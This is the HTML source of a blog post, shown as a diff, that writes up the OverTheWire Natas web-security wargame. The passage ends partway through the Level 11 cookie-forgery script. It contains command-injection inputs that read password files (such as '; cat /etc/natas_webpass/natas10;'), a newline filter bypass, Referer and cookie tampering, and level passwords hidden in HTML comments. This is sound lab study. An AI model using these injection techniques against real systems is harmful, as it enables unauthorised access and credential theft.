@@ -1,0 +1,1069 @@
+<!-- This website has been built with 💖 and 🍕 on 🌍 using Salinger Theme for Hugo framework. The theme has been released with MIT licence and can be found at https://github.com/jacksalici/salinger-theme. -->
+<!DOCTYPE html>
+<html lang="en"><head>
+  
+  
+  <meta name="title" content="Portfolio of an aspiring cybersecurity professional" />
+   
+  <meta name="description" content="My name is Justin, and this is my blog where I will document things I&#39;ve done, skills I&#39;ve acquired, and things I&#39;ve learnt." />
+   <meta name="keywords" content="coding44ctf44cybersecurity44OverTheWire44web"/>
+  <meta name="robots" content="index, follow" />
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Justin Ngo" />
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  
+  <link rel="shortcut icon" href="https://whoisjustinngo.github.io/logo.svg" />
+  
+
+  
+  
+
+  
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Newsreader:ital,wght@0,400;0,700;1,400;1,700&family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&family=Ubuntu:ital,wght@0,400;0,700;1,400;1,700&display=swap"
+    rel="stylesheet"
+  />
+
+       
+  <link href="/css/styles.min.709d3c6660552a09b2ac111885a56d7032e0ff83fa5e05a0247666f181b49d74.css" rel="stylesheet" />
+
+  
+  <link
+    rel="preload"
+    as="style"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"
+    integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css" integrity="sha384-ZPe7yZ91iWxYumsBEOn7ieg8q/o+qh/hQpSaPow8T6BwALcXSCS6C6fSRPIAnTQs" crossorigin="anonymous">
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js" integrity="sha384-ljao5I1l+8KYFXG7LNEA7DyaFvuvSCmedUf6Y6JI7LJqiu8q5dEivP2nDdFH31V4" crossorigin="anonymous"></script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"
+        onload="renderMathInElement(document.body);"></script>
+<script>
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+            
+            
+                delimiters: [
+                {left: '$$', right: '$$', display: true},
+                {left: '$', right: '$', display: false},
+                
+                
+                {left: "\begin{equation}", right: "\end{equation}", display: true},
+                {left: "\begin{align}", right: "\end{align}", display: true},
+            ],
+            
+            throwOnError : false
+        });
+    });
+</script>
+
+  
+
+  
+
+  
+  <script
+    src="https://unpkg.com/twemoji@latest/dist/twemoji.min.js"
+    crossorigin="anonymous"
+  ></script>
+  
+
+  <script
+    defer
+    src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"
+  ></script>
+
+  
+  <title>
+    OverTheWire: Natas ~
+    Whois Justin Ngo?
+  </title>
+
+  <script>
+  changeTheme()
+
+  function changeTheme(){
+    if (localStorage.theme === 'dim' || ((localStorage.theme === 'auto' || !('theme' in localStorage)) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+    document.documentElement.classList.add('dark')
+  } else {
+    document.documentElement.classList.remove('dark')
+  }
+  }
+
+  </script>
+</head>
+<body class="flex flex-col h-screen justify-between" tabindex="0">
+
+<div class="navbar bg-transparent backdrop-filter z-10 fixed top-0">
+  <div class="flex-1">
+    
+  </div>
+  <div class="flex-none">
+  
+    
+
+    <div class="dropdown dropdown-end dropdown-hover">
+        <label tabindex="0" class="btn btn-ghost btn-circle">
+        <a href = "/" title="Homepage">
+            <svg xmlns="http://www.w3.org/2000/svg" height="1.5em" viewBox="0 0 576 512"><style>svg{fill:#d4d4d4}</style><path d="M575.8 255.5c0 18-15 32.1-32 32.1h-32l.7 160.2c0 2.7-.2 5.4-.5 8.1V472c0 22.1-17.9 40-40 40H456c-1.1 0-2.2 0-3.3-.1c-1.4 .1-2.8 .1-4.2 .1H416 392c-22.1 0-40-17.9-40-40V448 384c0-17.7-14.3-32-32-32H256c-17.7 0-32 14.3-32 32v64 24c0 22.1-17.9 40-40 40H160 128.1c-1.5 0-3-.1-4.5-.2c-1.2 .1-2.4 .2-3.6 .2H104c-22.1 0-40-17.9-40-40V360c0-.9 0-1.9 .1-2.8V287.6H32c-18 0-32-14-32-32.1c0-9 3-17 10-24L266.4 8c7-7 15-8 22-8s15 2 21 7L564.8 231.5c8 7 12 15 11 24z"/></svg>
+        </a>
+        </label>
+    </div>
+    <div class="dropdown dropdown-end dropdown-hover">
+        <label tabindex="0" class="btn btn-ghost btn-circle">
+        <a href = "/posts/" title="Posts">
+            <svg xmlns="http://www.w3.org/2000/svg" height="1.5em" viewBox="0 0 448 512"><style>svg{fill:#d4d4d4}</style><path d="M96 0C43 0 0 43 0 96V416c0 53 43 96 96 96H384h32c17.7 0 32-14.3 32-32s-14.3-32-32-32V384c17.7 0 32-14.3 32-32V32c0-17.7-14.3-32-32-32H384 96zm0 384H352v64H96c-17.7 0-32-14.3-32-32s14.3-32 32-32zm32-240c0-8.8 7.2-16 16-16H336c8.8 0 16 7.2 16 16s-7.2 16-16 16H144c-8.8 0-16-7.2-16-16zm16 48H336c8.8 0 16 7.2 16 16s-7.2 16-16 16H144c-8.8 0-16-7.2-16-16s7.2-16 16-16z"/></svg>
+        </a>  
+        </label>
+    </div>
+    <div class="dropdown dropdown-end dropdown-hover">
+        <label tabindex="0" class="btn btn-ghost btn-circle">
+            <a href="/about" title="About me">
+                <svg xmlns="http://www.w3.org/2000/svg" height="1.5em" viewBox="0 0 448 512"><style>svg{fill:#d4d4d4}</style><path d="M224 256A128 128 0 1 0 224 0a128 128 0 1 0 0 256zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512H418.3c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304H178.3z"/></svg>
+            </a>
+        </label>
+    </div>
+    
+  </div>
+</div>
+
+<script>
+  
+</script>
+<div class="mb-auto"> 
+   
+    
+<div class=" bg-base-200  mb-7  place-items-start">
+    <div class="feed w-full pt-24 pb-10">
+      <div class="  space-y-3 ">
+        
+        
+
+        <h1 class="  text-4xl  font-bold font-serif">
+             OverTheWire: Natas 
+        </h1>
+        
+        
+        
+        
+
+        
+        <div class="text-xs pt-2">
+  
+  
+  
+  <svg class="icon w-4 h-4" xmlns="http://www.w3.org/2000/svg" height="48" viewBox="0 -960 960 960" width="48"><path d="M596.817-220Q556-220 528-248.183q-28-28.183-28-69T528.183-386q28.183-28 69-28T666-385.817q28 28.183 28 69T665.817-248q-28.183 28-69 28ZM180-80q-24 0-42-18t-18-42v-620q0-24 18-42t42-18h65v-28q0-13.6 9.2-22.8 9.2-9.2 22.8-9.2 14.025 0 23.513 9.2Q310-861.6 310-848v28h340v-28q0-13.6 9.2-22.8 9.2-9.2 22.8-9.2 14.025 0 23.513 9.2Q715-861.6 715-848v28h65q24 0 42 18t18 42v620q0 24-18 42t-42 18H180Zm0-60h600v-430H180v430Zm0-490h600v-130H180v130Zm0 0v-130 130Z"/></svg>
+      Published on
+    12 April 2024.
+
+
+      
+  
+
+  <br/>
+
+  
+
+
+  
+</div>
+
+        
+        
+        
+
+      </div>
+    </div>
+</div>
+
+
+
+   
+
+  
+
+  <article class="prose text-justify feed"><h2 id="introduction">Introduction</h2>
+<p><a href="https://overthewire.org/wargames/natas/">Natas</a> lets us practice web application penetration testing. Most of the levels were adequately challenging; the last few levels referenced unfamiliar techniques and vulnerabilities I wasn&rsquo;t aware of, and I had to refer to guides and walkthroughs to complete them.</p>
+<p>Nevertheless, I enjoyed completing the challenges. I learnt a lot of new concepts and had the chance to apply my knowledge by practicing many cool techniques, including:</p>
+<ul>
+<li>deploying webshells for remote code execution</li>
+<li>using path traversal and insecure direct object reference</li>
+<li>spotting command injection opportunities</li>
+<li>conducting time based SQL injections</li>
+<li>performing PHP object injection</li>
+<li>using PHAR deserialisation for object injection</li>
+<li>spotting exploitable vulnerabilities in perl</li>
+<li>scripting for brute force exploits</li>
+</ul>
+<p>Overall, I am quite happy with what I&rsquo;ve gotten out of completing these challenges. Moving forward, I hope to both expand my knowledge of known vulnerabilities while improving my ability to research such vulnerabilities to reduce the need for hints to solve similar challenges in the future.</p>
+<p>On to the next one!</p>
+<h2 id="challenges">Challenges</h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="#level-0">Level 0</a></td>
+<td><a href="#level-5">Level 5</a></td>
+<td><a href="#level-10">Level 10</a></td>
+<td><a href="#level-15">Level 15</a></td>
+<td><a href="#level-20">Level 20</a></td>
+<td><a href="#level-25">Level 25</a></td>
+<td><a href="#level-30">Level 30</a></td>
+</tr>
+<tr>
+<td><a href="#level-1">Level 1</a></td>
+<td><a href="#level-6">Level 6</a></td>
+<td><a href="#level-11">Level 11</a></td>
+<td><a href="#level-16">Level 16</a></td>
+<td><a href="#level-21">Level 21</a></td>
+<td><a href="#level-26">Level 26</a></td>
+<td><a href="#level-31">Level 31</a></td>
+</tr>
+<tr>
+<td><a href="#level-2">Level 2</a></td>
+<td><a href="#level-7">Level 7</a></td>
+<td><a href="#level-12">Level 12</a></td>
+<td><a href="#level-17">Level 17</a></td>
+<td><a href="#level-22">Level 22</a></td>
+<td><a href="#level-27">Level 27</a></td>
+<td><a href="#level-32">Level 32</a></td>
+</tr>
+<tr>
+<td><a href="#level-3">Level 3</a></td>
+<td><a href="#level-8">Level 8</a></td>
+<td><a href="#level-13">Level 13</a></td>
+<td><a href="#level-18">Level 18</a></td>
+<td><a href="#level-23">Level 23</a></td>
+<td><a href="#level-28">Level 28</a></td>
+<td><a href="#level-33">Level 33</a></td>
+</tr>
+<tr>
+<td><a href="#level-4">Level 4</a></td>
+<td><a href="#level-9">Level 9</a></td>
+<td><a href="#level-14">Level 14</a></td>
+<td><a href="#level-19">Level 19</a></td>
+<td><a href="#level-24">Level 24</a></td>
+<td><a href="#level-29">Level 29</a></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="a-namelevel-0a-level-0"><a name="level-0"></a> Level 0</h3>
+<p>Inspect page source to find password.</p>
+<!-- g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
+<h3 id="a-namelevel-1a-level-1"><a name="level-1"></a> Level 1</h3>
+<p>Right clicking is supposedly disabled. We can use keyboard shortcuts to view the source code where we will find the password. E.g. the shortcut for Firefox on a Mac is <code>cmd + u</code>.</p>
+<!-- h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
+<h3 id="a-namelevel-2a-level-2"><a name="level-2"></a> Level 2</h3>
+<p>The page states that &rsquo;there is nothing on this page&rsquo;, and inspecting the source code also doesn&rsquo;t yield anything. There is, however, a reference to <code>pixel.png</code> in a directory called <code>files</code> .</p>
+<p>Navigating to <code>http://natas2.natas.labs.overthewire.org/files/</code>, we see a file called <code>users.txt</code>, which shows the username and password combinations for various users including natas3.</p>
+<!-- G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q -->
+<h3 id="a-namelevel-3a-level-3"><a name="level-3"></a> Level 3</h3>
+<p>Inspecting the source code, we find the following message:</p>
+<blockquote>
+<p>&lsquo;No more information leaks!! Not even Google will find it this time&hellip;&rsquo;</p>
+</blockquote>
+<p>The statement that Google, a search engine, won&rsquo;t be able to find the password, seems to hint at the <code>robots.txt</code> file, which specifies which resources search engine crawlers are allowed / not allowed to access (<a href="https://developers.google.com/search/docs/crawling-indexing/robots/intro">source</a>).</p>
+<p>Sure enough, navigating to <code>http://natas3.natas.labs.overthewire.org/robots.txt</code> shows that a directory called <code>/s3cr3t/</code> is disallowed. Navigating to <code>http://natas3.natas.labs.overthewire.org/s3cr3t/</code> we find <code>users.txt</code>, just like the previous level, from which we can retrieve the password for natas4.</p>
+<!-- tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm -->
+<h3 id="a-namelevel-4a-level-4"><a name="level-4"></a> Level 4</h3>
+<p>The landing page contains the following message:</p>
+<blockquote>
+<p>Access disallowed. You are visiting from &ldquo;<a href="http://natas4.natas.labs.overthewire.org/index.php%22">http://natas4.natas.labs.overthewire.org/index.php&quot;</a> while authorized users should come only from &ldquo;<a href="http://natas5.natas.labs.overthewire.org/%22">http://natas5.natas.labs.overthewire.org/&quot;</a></p>
+</blockquote>
+<p>Inspecting the network traffic after refreshing the page, we observe that the &lsquo;Referer&rsquo; request header contains the value &lsquo;<a href="http://natas4.natas.labs.overthewire.org/index.php'">http://natas4.natas.labs.overthewire.org/index.php'</a>.</p>
+<p><a href="/images/otw_natas/natas4-1_referer-header.png"><img src="/images/otw_natas/natas4-1_referer-header.png" alt="&lsquo;Referer&rsquo; header in sent request"></a></p>
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer?utm_source=mozilla&amp;utm_medium=devtools-netmonitor&amp;utm_campaign=default">The docs</a> seems to indicate that this is the field we should focus on, i.e. we should change the referer to &lsquo;<a href="http://natas5.natas.labs.overthewire.org/'">http://natas5.natas.labs.overthewire.org/'</a>.</p>
+<p>We can do this by using Burpsuite to intercept the outgoing request when clicking &lsquo;refresh page&rsquo; and modifying the &lsquo;Referer&rsquo; header.</p>
+<p><a href="/images/otw_natas/natas4-2_modifying-header.png"><img src="/images/otw_natas/natas4-2_modifying-header.png" alt="Modifying request header using Burpsuite&rsquo;s repeater"></a></p>
+<p>Forwarding the request after modification yields the password for natas5.</p>
+<!-- Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD -->
+<h3 id="a-namelevel-5a-level-5"><a name="level-5"></a> Level 5</h3>
+<p>The webpage denies us access because we are not logged in. If use Burpsuite to intercept the outgoing traffic when refreshing the page, we see that there is a &rsquo;loggedin&rsquo; cookie with value 0. Changing the value of the cookie to 1 and forwarding the packet gives us access and the password for natas6.</p>
+<!-- fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR -->
+<h3 id="a-namelevel-6a-level-6"><a name="level-6"></a> Level 6</h3>
+<p>The landing page prompts us to enter a secret. This snippet in the source code checks for the correctness of the provided secret:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">include</span> <span style="color:#5af78e">&#34;includes/secret.inc&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(array_key_exists(<span style="color:#5af78e">&#34;submit&#34;</span>, <span style="color:#ff5c57">$_POST</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span>(<span style="color:#ff5c57">$secret</span> <span style="color:#ff6ac1">==</span> <span style="color:#ff5c57">$_POST</span>[<span style="color:#5af78e">&#39;secret&#39;</span>]) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">print</span> <span style="color:#5af78e">&#34;Access granted. The password for natas7 is &lt;censored&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#ff6ac1">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">print</span> <span style="color:#5af78e">&#34;Wrong secret&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>The code makes reference to <code>includes/secret.inc</code>. Navigating to <code>http://natas6.natas.labs.overthewire.org/includes/secret.inc</code> shows the value of <code>$secret</code>, and if we enter this value on the landing page, we get the password for natas7.</p>
+<!-- jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr -->
+<h3 id="a-namelevel-7a-level-7"><a name="level-7"></a> Level 7</h3>
+<p>The landing page shows two subpages we are able to access, &lsquo;about&rsquo; and &lsquo;home&rsquo;. Notice that when we click either of these 2 buttons, the url in the browser bar changes to <code>http://natas7.natas.labs.overthewire.org/index.php?page=&lt;page name&gt;</code>.</p>
+<p><a href="/images/otw_natas/natas7-1_url-structure.png"><img src="/images/otw_natas/natas7-1_url-structure.png" alt="URL structure for different subpages"></a></p>
+<p>This suggests that this webpage might be susceptible to <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">insecure direct object reference</a>. Since we know that the password for the next level is located at <code>/etc/natas_webpass/natas8</code>, we can try to reference this file in the <code>page</code> parameter in the URL to see if we can get the web server to retrieve the contents of this file. Since the path of the file contains slashes, we need to URL-encode the path (which can be done using online tools like <a href="https://www.urlencoder.org/">this</a>). Appending this encoded string to the URL after <code>?page=</code>, we get the password for natas8:</p>
+<p><a href="/images/otw_natas/natas7-2_success.png"><img src="/images/otw_natas/natas7-2_success.png" alt="successfully carrying out insecure direct object reference"></a></p>
+<!-- a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB -->
+<h3 id="a-namelevel-8a-level-8"><a name="level-8"></a> Level 8</h3>
+<p>Inspecting the source code, we see that the server encodes the value of the secret we input, then compares that result to an expected <code>encodedSecret</code> value. To get the expected secret in plaintext, all we have to do is reverse the encoding process.</p>
+<p>The encoding process is as follows: plaintext secret $\rightarrow$ base64 encode $\rightarrow$ string reverse $\rightarrow$ bin to hex conversion $\rightarrow$ encodedSecret. This means that to get the plaintext secret, all we have to do is:</p>
+<p>encodedSecret $\rightarrow$ hex to bin conversion $\rightarrow$ reverse string $\rightarrow$ base64 decode $\rightarrow$ plaintext secret.</p>
+<p>All conversions can be done using online tools:</p>
+<ul>
+<li><a href="https://www.rapidtables.com/convert/number/hex-to-binary.html">hex to bin convertor</a></li>
+<li><a href="https://onlinestringtools.com/reverse-string">string reverser</a></li>
+<li><a href="">base64 decoder</a></li>
+</ul>
+<p>A thing to note: after the hex to bin conversion, we need to convert the binary string to ascii text before putting it into the reverser, which can be done using an <a href="https://www.rapidtables.com/convert/number/binary-to-ascii.html">online tool</a> (need to split the bits into groups of 8).</p>
+<p>Going through the decoding process gives us the expected secret in plaintext, which we can use to log in and get the password for natas9.</p>
+<!-- Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd -->
+<h3 id="a-namelevel-9a-level-9"><a name="level-9"></a> Level 9</h3>
+<p>This site simulates a dictionary lookup: we enter a string and the server returns all words containing that string. We see that the search function is implemented as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$key</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(array_key_exists(<span style="color:#5af78e">&#34;needle&#34;</span>, <span style="color:#ff5c57">$_REQUEST</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$key</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$_REQUEST</span>[<span style="color:#5af78e">&#34;needle&#34;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(<span style="color:#ff5c57">$key</span> <span style="color:#ff6ac1">!=</span> <span style="color:#5af78e">&#34;&#34;</span>) {
+</span></span><span style="display:flex;"><span>    passthru(<span style="color:#5af78e">&#34;grep -i </span><span style="color:#5af78e">$key</span><span style="color:#5af78e"> dictionary.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>The search function is implemented by using <code>grep</code> to do a case-insensitive search of all strings in <code>dictionary.txt</code> containing <code>$key</code>. Notice that the value of <code>$key</code> is supplied by the user. This, in addition to the use of <code>passthru</code>, indicates that command injection might be possible.</p>
+<p>If we enter &lsquo;; echo &ldquo;hello world&rdquo;;&rsquo; as the string to search the dictionery for, we see the following:</p>
+<p><a href="/images/otw_natas/natas9-1_command-injection-poc.png"><img src="/images/otw_natas/natas9-1_command-injection-poc.png" alt="command injection"></a></p>
+<p>This happens because the actual command ran on server by <code>passthru()</code> is <code>grep -i ; echo &quot;hello world&quot;; dictionary.txt</code>. Since the semicolons separate the commands, and <code>grep -i</code> and <code>dictionary.txt</code> are themselves not valid commands, we only get &lsquo;hello world&rsquo; printed on the screen, which is the output of the <code>echo &quot;hello world&quot;</code> command.</p>
+<p>What we can do now is to view the password for natas10 by entering the command <code>; cat /etc/natas_webpass/natas10;</code> as the value of the string to search for.</p>
+<!-- D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE -->
+<h3 id="a-namelevel-10a-level-10"><a name="level-10"></a> Level 10</h3>
+<p>The concept of this level is similar to the previous level, except that the search function checks for illegal characters in the input (&rsquo;&amp;&rsquo;, &lsquo;|&rsquo;, &lsquo;[]&rsquo;, &lsquo;;&rsquo;) using the function preg_match.</p>
+<p>Doing a google search for &lsquo;preg_match php vulnerabilities&rsquo;, we find out that preg_match only checks the first line of the input (<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp">source</a>). This means that as long as we insert a newline character at the start of our input, we&rsquo;ll still be able to inject arbitrary commands to be executed on the web server.</p>
+<p>We can do this by using &lsquo;%0A&rsquo;, newline in URL-encoding, in combination with other URL-encoded commands to modify the URL in the browser bar, like the following:</p>
+<p><a href="/images/otw_natas/natas10-1_command-injection.png"><img src="/images/otw_natas/natas10-1_command-injection.png" alt="bypassing preg_match using newlines"></a></p>
+<p>The url un-encoded value of the needle parameter is &lsquo;&lt;newline&gt; echo &lsquo;hello world&rsquo;&lt;newline&gt;&rsquo;.</p>
+<p>Since we know the password is located at <code>/etc/natas_webpass/natas11</code>, retrieving the password is as simple as URL encoding the correct command to view the contents of this file, appending the newline characters, and entering the whole payload in the needle parameter in the URL.</p>
+<!-- 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg -->
+<h3 id="a-namelevel-11a-level-11"><a name="level-11"></a> Level 11</h3>
+<p>We see in the source code that the crucial variables &lsquo;showpassword&rsquo; and &lsquo;bgcolor&rsquo; are stored in an array (which we will call arr) which is json encoded. That array is passed to the <code>xor_encrypt</code> function to perform a xor encryption with a redacted key (multiple repeated copies of the redacted key to be accurate to account for difference in length between arr and key). The function then returnes a string which becomes the value of the data cookie</p>
+<p>To obtain the password for the next level, we need to somehow change &lsquo;showpassword&rsquo; in arr to true, encrypt arr, then set that as the value of the data cookie.</p>
+<p>We need to first figure out what the redacted value of key in the <code>xor_encrypt</code> function is. Thankfully, xor has a very <a href="https://en.wikipedia.org/wiki/Exclusive_or#Properties">useful property</a>: involution. Involution refers to the fact that:</p>
+<blockquote>
+<p>(A xor B) xor B = A</p>
+</blockquote>
+<p>Applying this to the task at hand, since</p>
+<blockquote>
+<p>arr xor key = key xor arr = cookie</p>
+</blockquote>
+<p>then</p>
+<blockquote>
+<p>cookie xor arr = key</p>
+</blockquote>
+<p>The following script helps us reverse engineer the key using this property:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">function</span> <span style="color:#57c7ff">find_key</span>(<span style="color:#ff5c57">$contents_to_encode</span>, <span style="color:#ff5c57">$final_cookie</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$key</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> (<span style="color:#ff5c57">$i</span><span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>; <span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">&lt;</span> strlen(<span style="color:#ff5c57">$final_cookie</span>); <span style="color:#ff5c57">$i</span><span style="color:#ff6ac1">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">$key</span> <span style="color:#ff6ac1">.=</span> <span style="color:#ff5c57">$final_cookie</span>[<span style="color:#ff5c57">$i</span>] <span style="color:#ff6ac1">^</span> <span style="color:#ff5c57">$contents_to_encode</span>[<span style="color:#ff5c57">$i</span>]; <span style="color:#78787e"># no need for modulo as both strings are necessarily the same length
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff5c57">$key</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$cookie</span> <span style="color:#ff6ac1">=</span> base64_decode(urldecode(<span style="color:#5af78e">&#34;&lt;cookie obtainable from browser&gt;&#34;</span>)); <span style="color:#78787e"># get rid of url and base64 encoding
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#ff5c57">$cookie_contents</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">array</span>(<span style="color:#5af78e">&#34;showpassword&#34;</span><span style="color:#ff6ac1">=&gt;</span><span style="color:#5af78e">&#34;no&#34;</span>, <span style="color:#5af78e">&#34;bgcolor&#34;</span><span style="color:#ff6ac1">=&gt;</span><span style="color:#5af78e">&#34;#ffffff&#34;</span>); <span style="color:#78787e"># default values defined in the source code
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span><span style="color:#ff5c57">$key</span> <span style="color:#ff6ac1">=</span> find_key(json_encode(<span style="color:#ff5c57">$cookie_contents</span>), <span style="color:#ff5c57">$cookie</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">print</span>(<span style="color:#ff5c57">$key</span>);
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
+</span></span></span></code></pre></div><p>The output of the script above is many repeated copies of the actual key, but inferring the actual key is simple. We can then use this key and the original <code>xor_encrypt</code> function to confirm the key:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">function</span> <span style="color:#57c7ff">xor_encrypt</span>(<span style="color:#ff5c57">$in</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$key</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;&lt;key from previous step&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$text</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$in</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$outText</span> <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e">// Iterate through each character
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e"></span>    <span style="color:#ff6ac1">for</span>(<span style="color:#ff5c57">$i</span><span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>;<span style="color:#ff5c57">$i</span><span style="color:#ff6ac1">&lt;</span>strlen(<span style="color:#ff5c57">$text</span>);<span style="color:#ff5c57">$i</span><span style="color:#ff6ac1">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">$outText</span> <span style="color:#ff6ac1">.=</span> <span style="color:#ff5c57">$text</span>[<span style="color:#ff5c57">$i</span>] <span style="color:#ff6ac1">^</span> <span style="color:#ff5c57">$key</span>[<span style="color:#ff5c57">$i</span> <span style="color:#ff6ac1">%</span> strlen(<span style="color:#ff5c57">$key</span>)];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff5c57">$outText</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">function</span> <span style="color:#57c7ff">test</span>(<span style="color:#ff5c57">$contents_to_encode</span>, <span style="color:#ff5c57">$final_cookie</span>) {
